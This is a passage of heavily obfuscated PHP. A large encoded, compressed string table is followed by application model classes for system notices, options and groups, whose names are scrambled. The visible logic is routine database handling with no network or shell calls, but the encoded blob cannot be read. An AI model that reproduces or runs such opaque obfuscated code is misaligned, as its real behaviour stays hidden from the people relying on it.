f3\x39\x3c\x83\x3b\x70\x4\xbe\xbe\x94\x96\x17\x12\x19\x9f\xff\x44\x8c\xbe\xfd\x58\x8f\x3c\x3f\x19\xaf\x2a\x33\x5e\xb5\x88\x35\x2d\x4a\x6d\x15\x6e\x87\x15\x65\x9e\xa6\xd0\x99\x6c\xaa\x26".strrev('ææx4»…a„(6ly`ô€‹e%e%xû“q\'¸™É¯Ï=u¿™]ß3DnqQJÕğ÷').base64_decode('z8OHeKaO7ieRef7CfHm1iSBucVknQOwgBM8qldxUVmLpALmVrO/hLMH1OipAGlYfRduDP82VGsA=')."\240\52\210\10\164\24\62\72\260\240\201\146\70\236\223\264\45\235\340\22\366\237\102\164\7\212\342\65\356\125\253\150\103\370\251\324\65\153\312\323\300\302\310\235\25\50\30\356\44\14\222\356\64\74\5\42"."\xd\x51\x43\xe7\x67\xe8\x76\x90\xb\x89\x14\x56\x86\xfe\x8a\x3a\x91\xe8\x42\x11\xa1\x47\x75\x47\x66\x17\xd3\xfe\x25\xb1\xee\xae\x6a\xdf\x94\x35\x6b\xfc\x6\xd3\xc3\x67\x5a\xbe\xac\xae\x8f\x97\xa6\xf1\x6e\x9f\xb3\x3c\x1a\x9"."\114\75\57\10\11\356\222\24\354\116\1\70\73\324\77\105\170\130\341\372\366\12\126\302\157\152\232\337\305\31\260\36\226\247\22\71\211\274\166\214\155\65\352\147\63\240\100\207\310\344\22\36\14\106\5\27"."\xce\xb9\x50\xc3\x8e\x68\x4c\x43\x9d\x6f\x31\x8a\xcf\x7c\x44\x16\x1e\x70\xbe\x74\xb4\x40\xbc\x62\x2e\x1b\x30\xd3\x70\xa0\x50\x70\x20\x2e\x16\xc1\xda\x15\x59\xa3\xd7\xcf\xb1\xd\xd5\xb8\xf0\xa5\x84\x87\x12\x56\x84\xe0\x3a\x57".base64_decode('Otapd2Vge2ySPIiQsVnk2JGno7Z4IgwWoykJK/HseVaqaBRsB/ZUyC1EFXnweoU2qNEiVQqI6Jo=')."\xaa\xc8\xdb\x85\x55\x8\x13\xd0\x1c\x40\x7\xa2\x83\xf3\xf0\xd7\x10\x2b\x9d\x6d\xaa\x22\x83\xb0\x32\xba\x8e\xea\x13\xb4\x57\xe9\x23\xa8\x62\x95\xc2\x70\x76\x4e\xe3\xf3\x58\xb4\x4d\x44\x7b\xb9\x3d\x3d\x36\x67\x45\x14\xa2\x33"."\xe\x36\xbc\x81\x28\xe8\xb9\x9c\x78\x3a\xfd\x3d\xe9\x44\x6\x5e\x79\xbb\x68\x66\xb3\x88\xc7\x26\x16\x8a\x4\x5\x12\x46\xbe\xf\xdf\xb6\xd1\x42\x89\x50\x1c\x5b\x8b\x75\xc4\x63\xc9\x58\x90\xbd\x15\xee\xbc\x96\xa3\x69\xd3\xd9"."\241\304\242\356\46\304\121\215\131\250\163\75\120\126\202\163\43\176\110\221\344\173\234\160\66\125\376\323\105\264\157\364\164\317\4\371\112\227\306\164\42\100\102\114\225\215\230\357\7\350\32\42\321\330\355\13"."\x42\x9e\x34\x59\x7a\xd3\x0\xbf\x9e\xa0\xa7\x7d\x5d\xd4\x4f\x58\x53\x1d\x33\x2c\x66\x6\x19\xc2\x6d\x2\x2b\x29\xe7\x28\x98\xb0\xf4\xf0\x89\x46\x78\xc0\xf\x68\x54\xec\xb0\x6a\xac\x51\x2\x2f\xf7\x56\x7b\xaa\x6b\x7c\x53\x6a"."\xab\xcb\x73\xa8\x79\x8b\x33\x1f\x9b\xb5\xab\xa7\x24\x50\x26\x3c\x8f\xb\xbc\x3\x31\xfd\xf\x46\xc2\xa1\x68\x52\xd\x3\xdb\x50\xdf\x30\xcb\x57\x27\xcc\xf2\xd\x4b\xbc\x7\x42\xc3\x41\xc9\xd5\xd\x99\x55\x9f\x63\x58\x15\xa6"."\x86\xde\xad\x27\xb9\x81\x86\x9e\x77\x48\x5a\xe9\x94\x66\x4d\xf6\x52\x45\x43\x5d\x5d\x9d\xb7\xae\x1e\xfd\xcf\xac\xd\x99\xcf\xfc\x46\xee\x84\x50\x14\xa9\xab\x6b\x24\xff\xd3\xc\x72\xbf\xd\x50\xe7\xcc\x21\x3e\xe4\xa0\x3d\xfa"."\63\244\353\320\41\240\262\350\60\135\142\54\153\127\20\173\164\120\160\327\140\131\204\201\111\261\224\47\336\166\30\172\235\53\35\346\347\52\344\372\22\142\71\35\261\351\151\171\26\270\326\36\300\260\174\107".base64_decode('xsKIhzTy/WRWoMP8KgsVEztlLr1aEe5WQvl0l/wxH5tdmije8/KyDK/8SChUoshNukVC5ZyukHA=')."\12\142\206\122\174\205\161\202\44\172\305\114\260\344\217\10\107\145\275\17\222\315\57\210\110\54\313\35\24\342\250\360\302\103\337\237\245\16\60\140\336\52\154\275\214\71\244\12\306\4\107\117\341\61\62\215"."\230\52\61\330\113\113\16\122\360\134\62\332\43\25\347\372\321\102\235\24\170\72\342\143\157\300\220\166\0\132\0\125\252\52\317\347\134\134\220\215\44\351\254\211\76\341\305\35\365\342\176\67\212\131\104\210"."\x2c\xc0\x5f\xe6\xa5\x86\x3c\xdc\xc3\xf\xa0\x16\x1a\x25\xcf\x78\x85\xf0\xe3\xf0\xd4\xca\xab\xf1\xd0\xb2\x45\xb6\xdd\xb\x4c\xd6\xcd\x71\x7b\xe1\x56\x54\x67\x31\x69\xf5\x98\x42\x43\xe2\x6b\x74\xc9\x59\xa\xf7\x3c\x45\xb5\x2f"._kodDe('Melv97ruloNkO5jXbYEubULf4TG/kTBWL9uJOheUS9/1ZPQU0ZUYN4U6P82jMDIPjse3gQWa+y+r').base64_decode('0exHkGDJk4bSOyon8+LlJSsU4r2Xy8mJ+Bqz1aHALPkg0tLcWFAqKik0iETnDpcygvwBbTkRn4Y=')."\x65\xed\x9\x72\x10\x71\xb6\xc1\xfb\xf1\x15\x20\xc6\x64\x20\x76\x51\xcb\x5b\x7d\xb2\x52\xa3\xab\x18\x61\x6c\x0\x7\x32\xe5\x37\x56\x44\xa0\x2a\x2c\xc2\x8a\x4a\x8f\x6c\x6b\xe9\x74\x87\x70\xb2\xa5\x3a\xa0\x68\x22\x80\x63\xdb"."\x4d\x52\x15\x71\x43\x1f\xc7\x20\x64\x6f\x71\x67\x5d\x4c\xd9\x19\x2f\x85\xd0\x21\x74\xa6\xd3\x34\x2a\x20\x71\xb8\x2a\x4b\x12\x2c\x9b\xd5\x93\x30\x13\x6c\xac\xf8\xb\xb8\x1\xa2\x14\xee\x5a\x3d\xb1\xe3\x1a\x19\xf7\x23\x57\x73"."\xe6\x61\x20\x4e\x9a\xe\x7d\xc5\xf7\xd6\x5e\xca\x2\x97\xd1\x0\x3\x3b\xe6\x2e\x8a\xac\x30\xf3\x64\xa4\xca\x57\x7c\x78\x7a\x54\x59\xba\x85\x91\x4b\x9b\x6d\x17\x9c\xd\x49\xc0\xef\x84\xfb\x32\x0\x27\xbc\x4\x6e\xa0\x91\x63"."\x48\x29\x86\x5b\x67\xb7\xab\xe8\xdc\xf\x8e\x2f\x3d\x38\x59\x31\xc9\xd5\x8b\x82\xdd\xca\x9d\xe0\x84\x8c\xf2\xa\xf0\xa2\xb6\x89\x98\x58\xfc\x16\x8f\x5c\x9\xb7\xd5\xe9\xc2\x96\x8b\x38\xc2\xc6\x31\xde\x57\xca\x4e\x32\xa3\xd".strrev('Cr)¾‰'."\0".'¹;`Ù›ÁÇ„>Â'."\n".'Qv:Â‚fÎƒÚÆ³ïæ;ÁƒÇ~}Š¹)\'×±&¡T¯’e')."\x88\x3b\x48\x66\xb0\xd8\xaa\x47\x21\x7d\x9f\x4b\x9c\xc7\x55\xc8\xc5\x5e\xc0\xd8\xd7\xf8\x63\x45\x40\x99\x50\x19\xd3\xe6\xe7\x79\xdc\x3c\xda\x13\x22\x12\x91\x19\x71\x9c\xd0\xa2\xf3\x47\xf2\x92\xb4\x5\xef\x7c\xd1\xf3\xb9\x1a"."\357\264\254\342\46\351\144\360\112\250\177\334\201\331\250\121\40\157\321\111\22\7\127\324\155\141\202\153\110\112\145\50\52\61\17\204\165\261\31\367\301\136\242\23\106\32\44\50\350\305\173\127\257\145\201\163".base64_decode('BazJiKNC/6BV3ibuQV7YiADfVdRTZjGN6bdAaKm8Hdf75SjRoWA7RrxsJTeB/StLSBHv1EDKLsk=')."\336\232\245\207\356\120\114\122\35\226\30\150\157\275\302\71\157\225\266\114\43\123\245\14\122\276\22\23\356\222\105\23\111\0\325\243\41\362\270\104\251\227\137\211\273\70\143\146\360\256\310\74\61\263\156\307".base64_decode('DRDXtHgEDveRqFn86JQYmVyFfLOsCs3DfKAwd5dzLKwN1MlWsVJOhU+RLGlGAQEsE3MDwx7RmYI=')."\x99\xb7\xbe\xc1\x3b\xd\xe\x5c\xb2\xe5\x3b\x3b\x4b\x2\x71\x43\xdb\x4b\x5a\x7d\x7c\x0\x67\x18\xe\x4c\x82\xa0\x9c\x28\x63\x4a\xca\x5\xc4\x89\xab\x70\x79\x47\x3c\xd7\xf2\x65\x24\x2e\x6e\x79\x8c\x68\x1\xca\xb8\x5d\xe8\xc2"."\122\173\41\267\356\44\317\247\123\200\263\133\34\146\135\256\2\150\3\70\363\311\27\145\103\113\352\116\326\111\256\134\215\300\343\231\262\356\27\251\45\224\112\205\301\33\112\62\251\166\243\230\2\241\353\210"."\x5\xa8\x1c\x93\x89\xe4\xa4\xc9\x13\xcb\x95\x81\x31\xac\xc1\x54\x52\xef\x3f\x70\xfe\xae\xa9\xc5\xde\x7f\x1c\x32\xd0\xf6\x11\xee\xa3\x5\xab\xdd\x63\x2\xce\x8d\xb9\x2c\x39\xc2\x72\x39\xc8\x59\x8e\x8\xb5\x63\x70\xd4\xe6\x49"."\xbc\xd4\x90\xce\x1c\xf9\x30\xb9\x41\x47\x5b\x87\x9f\x27\x35\xf3\x4d\x47\x25\x35\xc2\xe9\x77\x90\xe9\xf2\xeb\xc3\x3a\x9c\x36\x87\x72\x46\x4a\x89\xc4\x16\x86\x83\x81\x48\x4b\x38\xb1\x48\xc1\x1e\x4a\x25\xc7\x3d\xa8\xbb\x2a\xd9".strrev('×9~æÂhÙ±PÕ¨¯IC<å±kjêQî[#Ç,£Ş¥&•Ë€ÃÅË5­ÂkÛ:\'ÁØŸ$Àæô%ªŒ').base64_decode('eTntAbWzX86eEsQNwXainH+bbLxFtzG5nKAQwzZeL3/+Ewe9vejo5U3zI6slDqdkPaAx8bS7s1k=').strrev('ÈŞuóÓˆÒå[·/å| oB©B©cÔ€a±Ñ——¨¡p©t2(TEßV[ .ìy‹Ybôqº')."\17\32\226\41\160\23\253\61\42\267\36\150\151\17\107\325\100\44\22\133\342\260\334\111\313\317\354\112\253\40\46\134\366\322\313\247\335\244\256\231\31\244\233\3\62\231\21\342\20\274\321\233\65\311\207\63"."\x5d\x3d\xf9\x6d\x6\x89\x6a\x61\x69\x31\x62\x82\x35\xee\x83\xbf\xc0\xae\x19\x31\x75\x97\x9e\xe\x86\xa8\xf4\x30\x77\xa1\xa8\x19\x96\x2e\x25\x50\x1f\xcf\xcc\x86\x5e\xcb\x66\xa5\x3c\x7c\x99\x25\x45\x4b\x4e\x76\xa0\xe2\xa7\x54"."\xfa\x1\x96\x26\xe9\xc5\x57\x2a\x10\xf\x2f\x6c\x4b\xfe\x1f\x77\xd5\x48\xb\xd5\x6a\x83\xeb\xc5\x73\x8f\x2c\x74\x5f\x5\x69\x3b\xce\x6f\x8a\xc7\xc7\xcb\x53\xc0\x1d\xfa\xd7\x3e\x6c\xee\x11\x57\xb5\x2a\x71\x13\xb\x28\xca\x20"."\316\232\341\372\131\130\205\121\157\251\342\23\210\311\52\216\24\344\53\162\177\232\171\6\100\173\41\304\14\175\161\104\34\316\160\51\150\4\177\205\312\6\260\53\146\223\352\361\343\222\114\346\211\360\41\114"."\xb8\x43\x41\xd5\xf5\x32\xbb\xdb\xb6\xcd\xf1\xee\x7a\xd9\x37\xc8\xe3\x9b\x34\xaf\xb\x8f\x2\x95\xec\x11\x63\x42\x31\x6e\x9\x26\xaa\xba\x73\x2a\x74\x0\x65\x2b\x42\x90\xc8\xb\x60\x84\x48\x4\xfa\xe2\x21\x55\x65\x1e\xf3\x39"."\45\76\100\374\65\113\156\271\53\140\117\151\111\330\52\251\62\111\237\13\136\250\201\351\47\204\103\34\146\261\216\252\231\33\51\113\160\310\31\43\254\327\134\363\34\77\62\213\66\260\74\273\304\334\15\133".strrev('ˆ¯´ª&÷R¯ÚÌ‹q"–2Æx^ˆï,;œè&åˆô„ÌÒ*ÿêÓz/åÛ¤”è<oŠˆH{9')."\xef\x24\xf9\x61\x75\x87\x41\xa0\xe3\x21\x5d\x9a\xa1\x94\xf2\xf8\x16\x7\xa1\x20\x58\x71\xac\x3a\xc5\x4e\xe8\xa4\xb0\xd4\xb7\x49\xf4\xa7\x1b\x7e\x19\x79\x74\x77\x82\x62\x37\xf8\x64\x2d\x7\x40\xa7\xa1\x82\x94\xd0\xae\xb\x81"."\15\251\205\320\111\101\313\73\236\230\106\175\257\364\152\75\176\122\301\371\120\62\247\377\252\240\277\316\367\170\271\366\205\45\66\213\145\73\136\200\116\42\12\322\357\241\260\213\321\237\210\65\217\310\141\331".strrev('øµ&Iâ'."\n".'¯É4b#:ô“Üº_(8ùÄı†Ê¹}ÚX¶~ç¬3ô! ¥Ÿ1‚ğªÉ2eôl')."\35\2\331\375\11\344\165\46\333\124\342\234\114\245\52\44\11\211\26\212\273\134\232\10\367\272\245\174\230\136\146\71\122\213\322\311\125\176\76\207\136\160\11\137\31\120\34\365\263\203\336\154\303\204\311\115"."\x32\x6d\x3\x7e\x37\x81\xb0\xd\x3f\xe0\xfb\xcb\xb5\x13\xb0\x52\x1f\xe0\x11\xac\x44\xc5\xb4\xd7\x6\x4c\x72\x40\xf4\xc9\x47\x4b\x28\xa0\xcc\x53\x4\x38\xc8\x9b\x8c\x1a\x65\xa4\xd3\x1e\x12\x20\xf8\x41\x46\x6b\x6c\x5b\xba\x1e".strrev('‡Øå/“ÔhÂÃï‡«=‹pÏÎr–"õ,\'P¢tP¢«Ù6GãïE§ä!†¦É"F+.ƒ')."\261\262\211\207\77\160\355\241\57\171\170\350\151\324\202\312\324\226\150\342\267\267\161\377\71\213\300\217\107\145\47\54\367\341\212\317\227\253\102\334\75\173\130\174\351\226\305\13\125\15\30\4\217\70\117\230"."\60\152\61\102\151\110\245\142\326\103\24\125\74\114\173\324\65\176\307\324\212\261\312\153\345\262\220\344\321\130\126\36\145\147\61\233\20\146\157\244\107\142\241\344\331\377\332\316\200\311\10\71\212\246\235\70"."\xb0\x71\x5e\x6f\x91\x5d\xfc\xbb\x8b\x19\xe\xa8\x46\xf4\x59\x18\xe8\xd3\xb7\x69\xca\x48\x44\x39\x7c\x2f\xcb\xa5\x1b\xa6\xcd\x98\x23\x8b\x76\x4\x95\x12\xb7\xe5\xe0\xb4\xd\xee\xf9\x81\xdb\x11\xd0\xa3\x38\xe1\x55\x61\x4f\xe4"."\310\230\202\144\72\255\222\340\35\37\211\336\270\50\304\377\321\316\222\116\50\264\250\354\232\220\276\13\142\146\361\31\77\207\257\64\354\242\346\74\14\126\70\363\60\22\113\146\261\342\313\365\22\311\363\224".base64_decode('kT/KVRBohPHwGYX9mzdSA8RzHfkCtU/0WPqwh06YR76pp0cdodeGB8MBV7JsJDhd6LpVGC6eInE=')."\x2\x20\x9d\x14\x98\x87\xce\x2a\x23\x57\x4e\xed\x3e\x5b\xeb\xc5\x98\x56\x7a\xe4\x5\x23\x7\x49\xf9\x91\xd8\x79\xf3\xa6\xb0\xe5\xa8\x64\xcc\xca\x96\xb4\xd2\x44\xba\xbe\x46\x61\xdb\xc4\xba\x65\x96\x68\xcf\xd5\x2\x5d\x81\xa"."\0\42\372\46\275\345\103\206\305\316\312\130\206\57\142\316\101\202\334\115\144\113\347\333\312\7\142\74\227\104\302\35\313\147\107\52\15\275\302\20\276\2\256\331\31\324\177\262\350\272\244\133\345\134\40\127"."\x2f\x28\x93\xcb\x61\x86\xd8\x51\xca\x7\x6e\xaf\x66\x7b\x39\xa7\x14\x23\xf3\xb\x8c\x9f\x90\x0\xb8\x9a\x44\x5\x85\x50\xb4\xc7\xa3\x4c\x54\xa8\xcc\x57\x5\xdd\x37\x2\x28\xa5\x3c\x31\x12\xe6\x2\x67\x2\x91\x9\x43\xe8\xe2"."\x4e\x8d\xb8\x21\x11\xae\x12\x9\xea\x71\xa0\x21\xe9\xcd\x2c\xd9\x8d\x7\x69\x48\x86\xd5\xf2\xa6\x29\x11\x26\xf7\x8\x42\x12\x48\x44\x87\x30\x8\x40\x4e\x44\xc5\x86\xb8\x81\x9\x2c\xe4\xae\x61\x34\x49\x7d\x54\x75\x6f\x77\xc"."\xe\xa2\xd3\xb6\x29\x87\x5\x98\x60\x32\xc8\xad\x42\x51\x7\x1c\x47\x70\x14\x17\xab\x2e\x61\xdc\xb4\x2b\x91\xcd\x12\xd9\x63\x2\x83\x4b\x9e\x87\x1c\xc7\x3c\x7a\x12\x44\x8d\x3b\x8e\x7d\x96\x98\x9\xd8\x30\x69\xf\xc5\xe5\x3c"."\xca\x21\x19\x50\x19\xa0\x7a\x62\x33\x49\xbf\x26\x71\x15\xac\x53\xfd\x52\x88\x73\x37\x38\x22\x9\xeb\x1d\xae\x97\xb0\x27\x64\xd7\x26\x65\xe\x9d\xb0\xbf\x0\xf9\xb2\x95\x3e\x14\x43\xc3\xec\x38\xc3\x3b\x49\xf0\x6b\xa5\x3d\x27"."\xac\xc6\x3d\xc2\x52\xdc\xc3\x68\x2f\x96\x5d\x12\xc7\x1c\xb8\xe\x17\x70\x54\xa0\x3\x64\xd8\x5f\xc1\x45\xcd\xe0\x46\xd7\xdc\xc6\x92\x60\x52\x16\x59\x8\x27\xd\xe8\x36\x7e\xa8\x8c\x23\x68\x2a\xd6\x77\xd\xc8\xc9\x1d\x1c\x2"."\x0\x84\xe6\xdd\x37\x28\x50\x5\x89\x73\xcb\x3\xe6\x16\x9b\x79\xcb\xd6\xd8\xcd\x27\x62\xc8\xdd\x97\xe7\x65\x67\x33\xe1\xd7\xc6\x34\xb3\xbd\x5a\x11\x9b\xe2\xf\xd8\x4c\xbd\xab\x52\xc4\xed\xff\x23\xa1\xf5\xe9\x72\x9f\xbb\x88".base64_decode('2B0lEvvsHoEncFqlagILETJTkPAcaQulSK1wLVMoLKyvyWFBsiUHGuwaJ1HCdj4EJbFgZcVE5xA=').base64_decode('p8b1wFkohfkC4tYOJln2MxTjj9vWAsbvOZlhMOLuDBCZjLwcSWUoL+lYOkeivCoCS/mcfhWhBr4=')."\x6d\x6f\x96\x4e\xa5\xb4\x10\x7b\x75\x1\xf4\x68\x24\x1c\x4b\x78\xb8\x42\xc9\xfd\x4a\x12\x3d\x1a\xca\xb5\x64\xd5\x9c\xf2\xf\x70\x64\x22\x57\xc1\xa6\x23\x4e\xd9\x20\xf3\xe0\xe0\xad\xf3\xba\x12\xea\xbd\xae\xe6\xc\x8b\x5e\x28".base64_decode('uXaN3Blq2YUlVXEsG2KyQHIlSPQHvOV1JPcCso5B2R6tjDJ4p4Q8FIfk+WCop6Nokrl1pnJ5maQ=')."\x8f\x9f\x92\x84\xce\x6e\x7e\x8b\x26\x4f\xf2\xc9\x3\x91\x2f\xcd\x9d\x17\x73\xd8\x3b\x5e\x48\x5d\x12\xc6\x9e\xb2\xc2\xa7\x85\x3a\xd9\x13\x15\x86\x49\x9e\x8e\x64\xad\x74\xb6\xcb\x4f\x18\xe2\xab\x90\x56\x93\x3\x18\xde\x87\xe2"."\x6d\x5\x3b\x57\x8\xf2\xfb\x71\xa7\x75\xbc\x64\xcc\xc0\x9f\x8c\x94\x44\xaf\xce\xc2\xd8\x9e\xca\xb9\x2b\xe7\x57\x2a\x96\x32\x8b\x96\x54\xc\xb\x2e\x18\x7d\xee\x63\x1a\x2d\x9d\x79\xb4\x91\xf5\x94\xad\xa7\x15\x4c\xd4\x1d\xe7".strrev('<F@;a1 ‡”«ÿ:“!±T¯Q/8ê1Ã_BóLJ`p’šÿNJ =<µiùŒ5*zÓué®”').base64_decode('Sup+jNT5xGGjJBGmb7k6XiwuW6KoGRTciCsP44qJc/EZXugCYN9f2K0oNgzyE4UH9gKlmlOZ7hk=').base64_decode('lpMIERdBveVHYPiCXRyJFeO5aJkfXqf5n1SfHJKoLMsh0gKtDjlJui9CZ8208y1qkkmS2QMp0II=')."\164\141\357\124\223\340\306\323\145\24\265\144\104\244\154\122\213\71\333\107\277\330\273\103\130\170\206\44\331\364\236\57\340\76\374\111\265\72\35\347\170\111\251\42\105\60\105\250\374\132\135\334\366\113\254\50".strrev('»nO,r¨°œ¡×òCéq˜K–ä¸¬%…(‚NË¦Šƒj·N•œâÒ°PmGU˜K¥pU‚†«').base64_decode('pPquEzQZJk6rNHyC9pzVZbdgHKhEEimT4hpIkngCa2wJ1SQ6FC4eE590OiHjxfiaoTLE1tPrSHU=')."\35\260\261\374\221\161\226\256\54\220\315\111\315\127\24\341\111\40\240\147\43\122\163\262\306\305\204\25\22\225\77\42\240\322\71\305\222\270\112\144\60\356\306\164\114\276\244\106\305\7\6\45\343\162\246\243".base64_decode('OxVAgx02ZKFveaaZzeLr6gmyqca3RGnLS2S52hDtEDkki41DE3NEqETzAs4sWl53zZtcwT2ntIY=')."\114\357\34\351\103\206\235\312\110\47\372\362\314\362\364\142\331\62\103\7\52\217\303\335\133\266\312\156\15\54\321\110\131\177\44\365\260\244\131\241\16\355\121\305\152\64\13\327\24\7\55\107\335\11\246\0"."\327\245\131\270\156\131\66\253\134\66\257\244\236\255\225\254\11\206\127\76\171\40\254\114\127\30\260\20\2\112\105\47\232\317\212\205\313\77\7\173\300\135\232\210\304\52\367\102\222\31\72\225\141\52\365\242"."\142\341\11\173\341\56\55\370\40\174\254\256\224\123\161\203\202\226\107\5\212\301\162\52\320\10\212\377\46\324\206\23\312\142\345\304\112\344\125\320\127\3\207\143\56\117\146\25\262\145\345\267\312\352\161\361"."\x8a\xf8\xcd\x72\xaa\xb0\xb9\xd2\x1d\x2f\x1e\x50\x94\xc4\x18\xe3\x95\xb2\xe9\x33\x57\xdc\x14\x2d\x21\x86\x31\x6b\xc\x8\xd\x61\x66\xc8\x34\xc9\x41\xde\x4a\xf9\x81\xbc\xc9\x49\x66\x5a\x68\x85\xf3\x8e\x94\x35\xe0\xdc\x7\xf9".strrev('|\'Ğh“¸IT¿¡Íè„ï»D¬ŞÇÌ†Â³jIHÛMòÙ%ì²•‹•v*SEOàô’').strrev('ô‘à;0îì=ÚÛM›~@ Ô=´Y„ìĞIÊÛ“O_†GX‚ÕHÇpFr‘ÔÃˆ'."\0".'M$öÓØ').base64_decode('2lBI3EvjTpHrTQLD9PYBB0FhAkuSEjrNJUjPEcEXqTwSL79HbeVPrgyY6V5zmDmbRpAjzYnkXhM=').base64_decode('XFJKmnfEn47lpzl+eJLSS+49vOD+eEWh31Gdvk7O9fu/qgWQ+Ysm6Ht0RMYL5pWJZKIsqyOQSCw=')."\211\305\133\350\363\165\145\331\244\226\244\215\131\226\325\321\26\213\116\224\27\152\17\204\43\145\171\130\161\63\252\12\217\345\64\53\334\101\172\111\64\0\46\352\105\70\270\110\364\204\335\102\106\340\161\165"."\261\10\322\35\134\41\143\346\47\132\107\326\100\102\143\156\40\345\353\50\75\47\334\334\213\106\234\202\66\371\312\312\142\57\344\360\200\363\315\151\227\226\264\123\237\206\101\56\64\213\265\34\243\360\245\170"."\1\122\361\33\200\34\1\360\363\204\320\254\361\71\224\172\244\164\262\111\10\326\221\366\256\114\335\311\65\56\227\277\221\354\51\25\147\263\302\135\242\174\41\213\163\305\344\340\156\236\302\36\353\131\141\366"."\x4a\xfa\x8c\xf4\x6c\x7\x1e\x14\x60\xba\x25\xbd\x56\x1a\x76\x64\xdb\x5a\xbf\x97\xa3\x3\x49\x5d\x85\xca\xc4\x31\x52\x10\xd2\xea\xff\xf\xb2\x35\x2d\x4d\x31\xc9\x0\x0"."", 10, -8))); goto DÅ¥©¦çœå; DÅ¥©¦çœå: define($_SERVER[¹Éµ„ºå][0], $_SERVER[¹Éµ„ºå][1]); $_SERVER[ÃÂ¤•­ú] = explode($_SERVER[¹Éµ„ºå][2], gzinflate(substr($_SERVER[¹Éµ„ºå][3], 10, -8))); function binCheckEq($Šé°Ë¿Œ, $¼•èê) { return $Šé°Ë¿Œ == $¼•èê; } goto aÙ£Ì‹†”ç; d¯Ğ¨ƒ”Œ¿: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\156\157\164\x69\x63\x65\114\x69\x73\164"; public $field = array("\156\x61\155\x65", "\143\x6f\156\164\145\x6e\164", "\141\165\164\x68", "\155\157\x64\x65", "\x74\151\x6d\x65", "\164\x79\x70\145", "\x6c\x65\166\x65\154", "\145\156\x61\x62\154\x65", "\x73\157\162\164"); public function listData($£ûÄø®Ñ = false, $àê¿òÙâ = "\163\x6f\x72\164", $™ÛĞ×úá = false) { return parent::listData($£ûÄø®Ñ, $àê¿òÙâ, $™ÛĞ×úá); } public function add($Üéæ°¦š) { $á“¾©ñ» =& $_SERVER[¹Éµ„ºå]; $Í“ÊèÈ = time(); if ($Üéæ°¦š[$á“¾©ñ»[16]] == $á“¾©ñ»[2645]) { $Í“ÊèÈ = strtotime($Üéæ°¦š[$á“¾©ñ»[204]]); } $Üéæ°¦š[$á“¾©ñ»[204]] = $Í“ÊèÈ; return parent::insert($Üéæ°¦š); } public function update($¤ßµ»œ´, $ÒÒ²Éû¶) { $Á¹âí =& $_SERVER[¹Éµ„ºå]; $ä‰ÛÃÏº = $this->listData($¤ßµ»œ´); if (!$ä‰ÛÃÏº) { return !1; } $ï²ƒóÍğ = time(); if ($ÒÒ²Éû¶[$Á¹âí[16]] == $Á¹âí[2645]) { $ï²ƒóÍğ = strtotime($ÒÒ²Éû¶[$Á¹âí[204]]); } $ÒÒ²Éû¶[$Á¹âí[204]] = $ï²ƒóÍğ; return parent::update($¤ßµ»œ´, $ÒÒ²Éû¶); } public function remove($À‹õ•ì) { $“»„×ú§ = $this->listData($À‹õ•ì); if (!$“»„×ú§ || $“»„×ú§[$_SERVER[¹Éµ„ºå][189]]) { return !1; } return parent::remove($À‹õ•ì); } public function sort($·“³æ”é, $ÆºûÁÇ²) { return parent::update($·“³æ”é, $ÆºûÁÇ²); } public function enable($âÁÓ ÙÔ, $¼ ½ÒİÓ) { return parent::update($âÁÓ ÙÔ, array($_SERVER[¹Éµ„ºå][2646] => $¼ ½ÒİÓ)); } private function initUserOption() { $¤Ö€ˆã‹ =& $_SERVER[¹Éµ„ºå]; $this->optionType = $¤Ö€ˆã‹[2647]; $this->modelType = $¤Ö€ˆã‹[2648]; $this->field = array($¤Ö€ˆã‹[2649], $¤Ö€ˆã‹[32], $¤Ö€ˆã‹[204], $¤Ö€ˆã‹[33], $¤Ö€ˆã‹[2650], $¤Ö€ˆã‹[841], $¤Ö€ˆã‹[226]); } public function userNoticeGet($ÇÕÅÌÍ = false) { $this->initUserOption(); return parent::listData($ÇÕÅÌÍ, $_SERVER[¹Éµ„ºå][487], !0); } public function userNoticeAdd($€Ïç¡Ìé) { $‹ÎØÒ«³ =& $_SERVER[¹Éµ„ºå]; $this->initUserOption(); $ ÚÀµÖ¹ = $this->findByKey($‹ÎØÒ«³[2649], $€Ïç¡Ìé[$‹ÎØÒ«³[487]]); if ($ ÚÀµÖ¹) { return !0; } $óØŠäŸó = array($‹ÎØÒ«³[2649] => $€Ïç¡Ìé[$‹ÎØÒ«³[487]], $‹ÎØÒ«³[32] => $€Ïç¡Ìé[$‹ÎØÒ«³[32]], $‹ÎØÒ«³[204] => $€Ïç¡Ìé[$‹ÎØÒ«³[204]], $‹ÎØÒ«³[33] => isset($€Ïç¡Ìé[$‹ÎØÒ«³[33]]) ? $€Ïç¡Ìé[$‹ÎØÒ«³[33]] : 1, $‹ÎØÒ«³[2650] => isset($€Ïç¡Ìé[$‹ÎØÒ«³[2650]]) ? $€Ïç¡Ìé[$‹ÎØÒ«³[2650]] : 0, $‹ÎØÒ«³[841] => 0, $‹ÎØÒ«³[226] => 0); return parent::insert($óØŠäŸó); } public function userNoticeEdit($ïšÍ£¾š, $é—¤éñî) { $this->initUserOption(); return parent::update($ïšÍ£¾š, $é—¤éñî); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\x6d\x5f\157\160\x74\x69\x6f\156"; protected $jsonField = array("\155\145\156\165", "\x72\x6f\x6c\x65", "\x72\x6f\x6c\x65\x47\x72\157\165\160", "\x72\x65\x67\x69\x73\x74", "\145\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($‹æ‘Òç·) { return "\x53\171\x73\x74\x65\x6d\x4f\x70\x74\x69\x6f\156\x5f{$‹æ‘Òç·}"; } protected function optionDefault($ê—À¢û = '') { $òÇ§Ş­ã =& $_SERVER[¹Éµ„ºå]; if ($ê—À¢û == $òÇ§Ş­ã[12]) { return $GLOBALS[$òÇ§Ş­ã[6]][$òÇ§Ş­ã[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto A½ì½¡ù¶; CÌ¬É¶¨•: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\141\155\145" => "\147\x72\157\165\x70\x5f\155\x65\x74\x61", "\155\x65\x74\141\106\x69\x65\x6c\x64" => "\x67\162\x6f\165\160\111\104"); protected function cacheFunctionAlias($Ë§àå¦ù) { $•¡öü«º =& $_SERVER[¹Éµ„ºå]; return array($•¡öü«º[2252] => array($Ë§àå¦ù[0], $•¡öü«º[2253]), $•¡öü«º[2254] => array($Ë§àå¦ù[0], $•¡öü«º[2255])); } protected function 